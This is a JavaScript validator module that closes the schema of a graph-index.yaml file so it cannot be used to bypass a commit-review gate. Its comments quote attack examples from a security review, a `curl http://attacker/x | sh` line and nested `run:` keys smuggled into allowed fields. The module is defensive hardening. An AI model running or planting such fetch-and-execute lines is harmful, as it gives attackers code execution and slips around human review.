// Closed SCHEMA for graph-index.yaml, extracted from validate-graph.js so it can be
// unit-tested — same extraction rationale as lib/readme-counts.js. A check that cannot be
// fed a failing input in a test is a check nobody has watched fail.
//
// WHY THIS EXISTS: ~/.claude/skills/review/scripts/classify-diff.js exempts
// graph-index.yaml from the commit gate's YAML orchestration net (DATA_YAML_PATHS),
// justified by "the schema has no exec surface to grow". A security review on 2026-08-22
// showed that claim was enforced by nothing — `run: curl http://attacker/x | sh` appended
// at top level classified inert and was committable with zero reviewers. This module is
// the enforcement. If it fails, FIX THE KEY. Widening it means first pulling
// graph-index.yaml from DATA_YAML_PATHS, in the same change.
//
// KEY NAMES ARE NOT ENOUGH — the depth-2 lesson. A first version checked only key names at
// top level and per node. Review caught that `source: {run: "curl | sh"}` and
// `domains: [ai, {run: "..."}]` both used ALLOWED key names at both levels and passed
// clean, because nothing constrained the VALUES. The exploit had been demonstrated at
// depth 2, so depth 2 was what got closed — but a demonstrated exploit is one sample from
// the vulnerable set, not its boundary. Constraining value SHAPES closes depth entirely:
// once no value below a node may be a mapping, no key can exist down there to smuggle.
//
// Allowlist, NOT a required-field list. Measured across 273 nodes on 2026-08-22:
// title/description/topics/source/outgoing on 273; source_file on 140; domain on 98.
// The last two are optional. Presence is not the invariant — absence of anything else is.

export const ALLOWED_TOP_KEYS = Object.freeze(['last_updated', 'node_count', 'domains', 'nodes']);

export const ALLOWED_NODE_KEYS = Object.freeze([
  'title', 'description', 'topics', 'source', 'source_file', 'domain', 'outgoing',
]);

// Private Sets: an exported Set is mutable through `.add()` even when frozen, so any
// importer could widen the allowlist at runtime. For a module whose whole job is to be
// the last line before a gate bypass, export the frozen data and keep the lookups here.
const TOP = new Set(ALLOWED_TOP_KEYS);
const NODE = new Set(ALLOWED_NODE_KEYS);

const SCALAR_NODE_KEYS = new Set(['title', 'description', 'source', 'source_file', 'domain']);
const LIST_NODE_KEYS = new Set(['topics', 'outgoing']);

const isMapping = v => typeof v === 'object' && v !== null && !Array.isArray(v) && !(v instanceof Date);
// A Date counts as scalar: `last_updated: 2026-08-21` unquoted parses to a Date under
// js-yaml 4 (verified 2026-08-22 — treating it as a string would fail the real file).
const isScalar = v => !isMapping(v) && !Array.isArray(v);

/**
 * @param {unknown} graphIndex parsed graph-index.yaml — UNTRUSTED by construction. This is
 *   the function that decides whether it is shaped like a graph index at all, so it cannot
 *   take a type that already asserts that.
 * @returns {string[]} one message per violation; empty array means the schema is closed.
 */
export function unknownKeys(graphIndex) {
  const found = [];

  // Fail LOUD, never empty. Returning [] on a non-mapping would make a malformed or
  // truncated graph-index.yaml PASS the one check standing in for the review gate.
  if (!isMapping(graphIndex)) {
    return ['graph-index.yaml did not parse to a mapping — the closed-schema check could not run'];
  }

  for (const [k, v] of Object.entries(graphIndex)) {
    if (!TOP.has(k)) {
      found.push(`top-level key "${k}" is not in the allowed set`);
      continue;
    }
    if (k === 'nodes') continue;                       // shape-checked below
    if (Array.isArray(v)) {
      if (!v.every(isScalar)) found.push(`top-level "${k}": list may hold scalars only (a mapping here is exec surface)`);
    } else if (!isScalar(v)) {
      found.push(`top-level "${k}": must be a scalar or a list of scalars`);
    }
  }

  const nodes = graphIndex.nodes;
  if (!isMapping(nodes)) {
    // Not "someone else's problem": with nodes missing, validate-graph.js dies at its own
    // Object.keys() before printing anything, and with nodes present-but-scalar every other
    // check no-ops and the file passes. Neither is a guard — so report it here.
    found.push('"nodes" must be a mapping of slug -> node');
    return found;
  }

  for (const [slug, node] of Object.entries(nodes)) {
    if (!isMapping(node)) {
      found.push(`${slug}: node must be a mapping`);
      continue;
    }
    for (const [k, v] of Object.entries(node)) {
      if (!NODE.has(k)) {
        found.push(`${slug}: key "${k}" is not in the allowed set`);
      } else if (SCALAR_NODE_KEYS.has(k) && typeof v !== 'string') {
        found.push(`${slug}: "${k}" must be a string (a nested mapping here is exec surface)`);
      } else if (LIST_NODE_KEYS.has(k) && (!Array.isArray(v) || !v.every(e => typeof e === 'string'))) {
        found.push(`${slug}: "${k}" must be a list of strings`);
      }
    }
  }

  return found;
}
